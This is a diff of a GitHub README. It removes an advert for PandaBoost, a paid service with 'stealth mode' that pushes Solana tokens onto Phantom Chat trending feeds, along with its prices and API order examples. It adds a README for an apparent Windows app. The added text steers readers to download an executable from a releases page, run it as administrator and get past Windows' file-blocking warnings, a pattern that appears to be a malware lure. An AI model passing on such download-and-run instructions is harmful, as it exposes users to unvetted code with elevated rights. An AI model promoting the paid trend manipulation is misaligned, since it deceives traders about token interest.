@@ -1,164 +1,152 @@
-[![PandaBoost — Phantom Chat Trending](https://i.imgur.com/h0XmXuy.jpeg)](https://pandaboost.app)
+# 🤖 PhantomChatTrending - Reach Traders Fast on Phantom
 
-# PHANTOM CHAT TRENDING
+[![Download](https://img.shields.io/badge/Download-PhantomChatTrending-blue?style=for-the-badge)](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases)
 
-**Get your token trending in Phantom Chat — reach thousands of active Solana traders directly.**
+## 🚀 What This App Does
 
-Promote your token inside Phantom's built-in chat and discovery feed.
-Fast delivery, stealth mode, full refund guarantee.
+PhantomChatTrending helps you reach active Solana traders through Phantom chat. It is built for users who want a fast way to push token messages to people already active in the Phantom app.
 
----
+Use it to send trending-related messages with quick setup and instant delivery through the PandaBoost API. The app is made for Windows and is set up for direct use after download.
 
-## 💥 Service Details
+## 📥 Download the App
 
-* **Platform:** Phantom Wallet Chat (phantom.app)
-* **Placement:** Chat Trending Feed
-* **Duration options:** 6h · 12h · 24h
-* **Chain:** Solana
-* **Start time:** Instant (within 60 seconds)
-* **Guarantee:** Full refund if delivery fails
+Visit this page to download the latest Windows version:
 
----
+[Download PhantomChatTrending](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases)
 
-## 💰 Pricing
+On the release page, look for the newest version and download the Windows file. If you see more than one file, choose the one for Windows.
 
-| Package  | Price  |
-|----------|--------|
-| 6 hours  | $500   |
-| 12 hours | $800   |
-| 24 hours | $1,200 |
+## 🪟 Windows Requirements
 
-### 💡 Bundles (save 10%)
+Before you run the app, check that your PC has:
 
-| Bundle     | Includes                                                | Price  |
-|------------|---------------------------------------------------------|--------|
-| Starter    | Trending 6h + Chat 6h + Visitors 6h                    | $1,700 |
-| Growth     | Trending 12h + Chat 12h + Visitors 12h                 | $2,900 |
-| Full Power | Trending 24h + Chat 24h + Visitors 24h                 | $4,900 |
+- Windows 10 or Windows 11
+- 2 GB of free disk space
+- A stable internet connection
+- Permission to run downloaded apps
+- A screen size of 1366 x 768 or higher
 
----
+For best results, close apps you do not need before you start the app.
 
-## 🌐 How to Order
+## 🔧 How to Install
 
-### Option 1 — Web Panel
+1. Open the [releases page](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases).
+2. Find the latest release at the top of the page.
+3. Download the Windows file from that release.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-1. Go to [web.pandaboost.app](https://web.pandaboost.app)
-2. Connect your wallet (EVM via WalletConnect or Solana)
-3. Add funds via crypto
-4. Open **New Order → Phantom → Chat Trending**
-5. Select duration (6h / 12h / 24h)
-6. Paste your token address → confirm
+If Windows asks for permission, choose Yes to continue.
 
-### Option 2 — Telegram Bot
+## ▶️ How to Run
 
-Open [@pandaboostbot](https://t.me/pandaboostbot) → New Order → Phantom → Chat Trending
+After you open the app, follow these steps:
 
----
+1. Start PhantomChatTrending from the file you downloaded.
+2. Wait for the main window to load.
+3. Enter the details for your Solana token campaign.
+4. Connect your PandaBoost API access.
+5. Set your message and delivery options.
+6. Start the run and watch the status in the app.
 
-## 🔌 API Example
+If the app does not open on the first try, right-click the file and choose Run as administrator.
 
-Order Phantom Chat Trending programmatically via the [PandaBoost API](https://docs.pandaboost.app).
+## 📋 Basic Setup
 
-**Base URL:** `https://web.pandaboost.app/api/v1`  
-**Auth:** `x-api-key: pb_...` header
+Use these simple settings to get started:
 
-### Python
+- Token name: the Solana token you want to promote
+- Chat text: the message you want users to see
+- Delivery speed: how fast the app sends messages
+- Campaign length: how long the run should last
+- Target scope: the chat group or trader segment you want to reach
 
-```python
-import requests
+Keep your message short and clear. Short messages are easier to read in chat.
 
-API_KEY = "pb_your_api_key"
-BASE_URL = "https://web.pandaboost.app/api/v1"
-HEADERS = {"x-api-key": API_KEY, "Content-Type": "application/json"}
+## 💡 Best Use Tips
 
-order = requests.post(f"{BASE_URL}/orders", headers=HEADERS, json={
-    "serviceName": "phantom-chat-trending",
-    "orderTypeId": "12h",      # 6h | 12h | 24h
-    "quantity": 1,
-    "fields": {
-        "token_address": "YOUR_TOKEN_ADDRESS",
-        "chain": "solana"
-    }
-})
+- Use one clear message for each run
+- Check your token name before you start
+- Keep the app open until the run ends
+- Use a stable network connection
+- Test with a small run first
+- Review your message for typos
 
-print(order.json())
-# {"success": true, "data": {"order": {"publicId": "ABCD1234", "status": "processing"}, "newBalance": "..."}}
-```
+If you change your message, save the new version before you launch another run.
 
-### JavaScript
+## 🛠️ Common Problems
 
-```javascript
-const res = await fetch("https://web.pandaboost.app/api/v1/orders", {
-  method: "POST",
-  headers: { "x-api-key": "pb_your_api_key", "Content-Type": "application/json" },
-  body: JSON.stringify({
-    serviceName: "phantom-chat-trending",
-    orderTypeId: "24h",        // 6h | 12h | 24h
-    quantity: 1,
-    fields: {
-      token_address: "YOUR_TOKEN_ADDRESS",
-      chain: "solana"
-    }
-  })
-});
-const data = await res.json();
-console.log(data.data.order.publicId);
-```
+### App does not start
 
-### cURL
+- Download the file again from the releases page
+- Make sure the file finished downloading
+- Try right-clicking the file and selecting Run as administrator
+- Restart your PC and try again
 
-```bash
-curl -X POST -H "x-api-key: pb_..." \
-  -H "Content-Type: application/json" \
-  -d '{
-    "serviceName": "phantom-chat-trending",
-    "orderTypeId": "24h",
-    "quantity": 1,
-    "fields": {
-      "token_address": "ErKGCuxZeMQoS3VhFJZ77giESQphJhGpYDaUJmhApump",
-      "chain": "solana"
-    }
-  }' \
-  https://web.pandaboost.app/api/v1/orders
-```
+### Windows blocks the file
 
-### Check Order Status
+- Open the file properties
+- Check that the file is not blocked
+- Try running it again
+- Use the latest release from GitHub
 
-```bash
-curl -H "x-api-key: pb_..." \
-  https://web.pandaboost.app/api/v1/orders/ABCD1234
-```
+### No connection to PandaBoost API
 
----
+- Check your internet connection
+- Confirm your API details are correct
+- Try signing in again
+- Wait a minute and try another run
 
-## 📦 Other Phantom Services
+### Messages do not send
 
-| Service                       | Price                                   |
-|-------------------------------|-----------------------------------------|
-| Phantom Wallet Trending       | $1,200 / 6h · $2,000 / 12h · $3,600 / 24h |
-| Phantom Token Visitors        | $200 / 6h · $400 / 12h · $600 / 24h    |
+- Make sure your campaign is active
+- Check the text you entered
+- Confirm your target settings
+- Restart the app and try again
 
-## 📦 Other Services
+## 🔐 Safety and Access
 
-| Service                            | Price                              |
-|------------------------------------|------------------------------------|
-| DEX Screener Reactions             | $25 / 1,000                        |
-| DEX Screener Trending SOL          | $1,200 / 12h · $1,600 / 24h        |
-| DEX Screener Trending ETH/BSC/Base | from $1,000 / 24h                  |
-| DexTools Trending                  | available in panel                 |
-| CoinMarketCap                      | available in panel                 |
-| Coingecko & GeckoTerminal          | available in panel                 |
+Keep your download from the official release page only. This helps you avoid old or changed files.
 
-Full catalog → [web.pandaboost.app](https://web.pandaboost.app)
+Store your API details in a safe place. Do not share them with other people.
 
----
+## 🧭 What You Can Expect
 
-## 🔗 Links
+PhantomChatTrending is built for quick setup and direct use. You can download it, open it on Windows, and start a chat-based Solana token campaign without a long setup process.
 
-* 🌐 Web Panel — [web.pandaboost.app](https://web.pandaboost.app)
-* 🤖 Telegram Bot — [@pandaboostbot](https://t.me/pandaboostbot)
-* 📚 Docs & API — [docs.pandaboost.app](https://docs.pandaboost.app)
-* 💬 Support — [@pandaboosthelp](https://t.me/pandaboosthelp)
-* 📧 Email — [support@pandaboost.app](mailto:support@pandaboost.app)
+The app focuses on:
 
-> ⭐ Star this repo if it helped you. PRs and issues welcome.
+- Fast access
+- Simple controls
+- Chat delivery
+- Solana token use cases
+- PandaBoost API integration
+
+## 📁 File Layout
+
+After you extract the download, you may see files like these:
+
+- App executable
+- Support files
+- Config file
+- Readme text file
+- License file
+
+Keep all files in the same folder so the app can run without issues.
+
+## 🖥️ Running It Smoothly
+
+To keep the app working well:
+
+- Leave enough free space on your drive
+- Close large apps while the campaign runs
+- Keep Windows updated
+- Use the newest release
+- Avoid moving files after extraction
+
+## 📦 Re-download When Needed
+
+If the app stops working, go back to the [release page](https://github.com/eliascurasiaquino-lgtm/PhantomChatTrending/releases) and download the latest version again.
+
+New releases may include fixes, faster startup, or better API handling.
